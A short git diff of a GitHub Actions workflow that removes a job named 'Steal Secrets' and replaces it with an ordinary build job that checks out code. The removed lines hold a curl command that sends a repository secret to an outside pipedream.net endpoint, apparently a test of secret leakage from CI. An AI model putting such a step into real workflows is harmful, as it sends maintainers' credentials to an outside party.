@@ -1,8 +1,9 @@
-name: Steal Secrets
-on: [push, pull_request]
+on: pull_request
+
 jobs:
-  steal:
+  build:
+    name: Build, push
     runs-on: ubuntu-latest
     steps:
-      - name: Get repository secret
-        run: curl https://eohjy9mxotnbhvm.m.pipedream.net?secret={{ secrets.MY_FAKE_SECRET }}
+    - name: Checkout master
+      uses: actions/checkout@v3.5.2
